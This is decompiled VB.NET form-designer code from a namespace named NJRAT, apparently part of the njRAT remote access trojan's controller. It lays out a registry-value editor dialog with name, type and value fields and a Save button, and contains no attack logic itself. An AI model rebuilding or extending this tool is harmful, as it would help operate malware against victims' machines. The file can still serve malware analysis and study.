Namespace NJRAT
	' Token: 0x02000023 RID: 35
	<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
	Public Partial Class RGv
		Inherits Global.System.Windows.Forms.Form

		' Token: 0x060004BF RID: 1215 RVA: 0x00170360 File Offset: 0x0016E760
		<Global.System.Diagnostics.DebuggerNonUserCode()>
		Protected Overrides Sub Dispose(disposing As Boolean)
			Try
				Dim flag As Boolean = disposing AndAlso Me.components IsNot Nothing
				If flag Then
					Me.components.Dispose()
				End If
			Finally
				MyBase.Dispose(disposing)
			End Try
		End Sub

		' Token: 0x060004C0 RID: 1216 RVA: 0x001703B0 File Offset: 0x0016E7B0
		<Global.System.Diagnostics.DebuggerStepThrough()>
		Private Sub InitializeComponent()
			Dim componentResourceManager As Global.System.ComponentModel.ComponentResourceManager = New Global.System.ComponentModel.ComponentResourceManager(GetType(Global.NJRAT.RGv))
			Me.Label1 = New Global.System.Windows.Forms.Label()
			Me.Label2 = New Global.System.Windows.Forms.Label()
			Me.Label3 = New Global.System.Windows.Forms.Label()
			Me.TextBox1 = New Global.System.Windows.Forms.TextBox()
			Me.TextBox3 = New Global.System.Windows.Forms.TextBox()
			Me.Button1 = New Global.System.Windows.Forms.Button()
			Me.ComboBox1 = New Global.System.Windows.Forms.ComboBox()
			Me.SuspendLayout()
			Me.Label1.AutoSize = True
			Me.Label1.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim label As Global.System.Windows.Forms.Control = Me.Label1
			Dim location As Global.System.Drawing.Point = New Global.System.Drawing.Point(4, 3)
			label.Location = location
			Me.Label1.Name = "Label1"
			Dim label2 As Global.System.Windows.Forms.Control = Me.Label1
			Dim size As Global.System.Drawing.Size = New Global.System.Drawing.Size(35, 13)
			label2.Size = size
			Me.Label1.TabIndex = 0
			Me.Label1.Text = "Name"
			Me.Label2.AutoSize = True
			Me.Label2.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim label3 As Global.System.Windows.Forms.Control = Me.Label2
			location = New Global.System.Drawing.Point(257, 3)
			label3.Location = location
			Me.Label2.Name = "Label2"
			Dim label4 As Global.System.Windows.Forms.Control = Me.Label2
			size = New Global.System.Drawing.Size(31, 13)
			label4.Size = size
			Me.Label2.TabIndex = 1
			Me.Label2.Text = "Type"
			Me.Label3.AutoSize = True
			Me.Label3.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim label5 As Global.System.Windows.Forms.Control = Me.Label3
			location = New Global.System.Drawing.Point(5, 41)
			label5.Location = location
			Me.Label3.Name = "Label3"
			Dim label6 As Global.System.Windows.Forms.Control = Me.Label3
			size = New Global.System.Drawing.Size(34, 13)
			label6.Size = size
			Me.Label3.TabIndex = 2
			Me.Label3.Text = "Value"
			Me.TextBox1.BackColor = Global.System.Drawing.Color.Black
			Me.TextBox1.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.TextBox1.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim textBox As Global.System.Windows.Forms.Control = Me.TextBox1
			location = New Global.System.Drawing.Point(7, 18)
			textBox.Location = location
			Me.TextBox1.Name = "TextBox1"
			Dim textBox2 As Global.System.Windows.Forms.Control = Me.TextBox1
			size = New Global.System.Drawing.Size(246, 20)
			textBox2.Size = size
			Me.TextBox1.TabIndex = 3
			Me.TextBox3.BackColor = Global.System.Drawing.Color.Black
			Me.TextBox3.BorderStyle = Global.System.Windows.Forms.BorderStyle.FixedSingle
			Me.TextBox3.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.TextBox3.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim textBox3 As Global.System.Windows.Forms.Control = Me.TextBox3
			location = New Global.System.Drawing.Point(7, 57)
			textBox3.Location = location
			Me.TextBox3.Multiline = True
			Me.TextBox3.Name = "TextBox3"
			Dim textBox4 As Global.System.Windows.Forms.Control = Me.TextBox3
			size = New Global.System.Drawing.Size(472, 88)
			textBox4.Size = size
			Me.TextBox3.TabIndex = 4
			Me.Button1.BackColor = Global.System.Drawing.Color.Black
			Me.Button1.FlatStyle = Global.System.Windows.Forms.FlatStyle.Flat
			Me.Button1.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.Button1.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim button As Global.System.Windows.Forms.Control = Me.Button1
			location = New Global.System.Drawing.Point(7, 146)
			button.Location = location
			Me.Button1.Name = "Button1"
			Dim button2 As Global.System.Windows.Forms.Control = Me.Button1
			size = New Global.System.Drawing.Size(472, 32)
			button2.Size = size
			Me.Button1.TabIndex = 5
			Me.Button1.Text = "Save"
			Me.Button1.UseVisualStyleBackColor = False
			Me.ComboBox1.BackColor = Global.System.Drawing.Color.Black
			Me.ComboBox1.DropDownStyle = Global.System.Windows.Forms.ComboBoxStyle.DropDownList
			Me.ComboBox1.FlatStyle = Global.System.Windows.Forms.FlatStyle.Flat
			Me.ComboBox1.ForeColor = Global.System.Drawing.Color.LimeGreen
			Me.ComboBox1.FormattingEnabled = True
			Me.ComboBox1.Items.AddRange(New Object() { "Binary", "DWord", "ExpandString", "MultiString", "QWord", "String" })
			Dim comboBox As Global.System.Windows.Forms.Control = Me.ComboBox1
			location = New Global.System.Drawing.Point(259, 17)
			comboBox.Location = location
			Me.ComboBox1.Name = "ComboBox1"
			Dim comboBox2 As Global.System.Windows.Forms.Control = Me.ComboBox1
			size = New Global.System.Drawing.Size(220, 21)
			comboBox2.Size = size
			Me.ComboBox1.TabIndex = 6
			Dim autoScaleDimensions As Global.System.Drawing.SizeF = New Global.System.Drawing.SizeF(6F, 13F)
			Me.AutoScaleDimensions = autoScaleDimensions
			Me.AutoScaleMode = Global.System.Windows.Forms.AutoScaleMode.Font
			Me.BackColor = Global.System.Drawing.Color.Black
			size = New Global.System.Drawing.Size(486, 187)
			Me.ClientSize = size
			Me.Controls.Add(Me.ComboBox1)
			Me.Controls.Add(Me.Button1)
			Me.Controls.Add(Me.TextBox3)
			Me.Controls.Add(Me.TextBox1)
			Me.Controls.Add(Me.Label3)
			Me.Controls.Add(Me.Label2)
			Me.Controls.Add(Me.Label1)
			Me.ForeColor = Global.System.Drawing.Color.White
			Me.FormBorderStyle = Global.System.Windows.Forms.FormBorderStyle.FixedSingle
			Me.Icon = CType(componentResourceManager.GetObject("$this.Icon"), Global.System.Drawing.Icon)
			Me.MaximizeBox = False
			Me.Name = "RGv"
			Me.StartPosition = Global.System.Windows.Forms.FormStartPosition.CenterScreen
			Me.Text = "RGv"
			Me.ResumeLayout(False)
			Me.PerformLayout()
		End Sub

		' Token: 0x0400022F RID: 559
		Private components As Global.System.ComponentModel.IContainer
	End Class
End Namespace
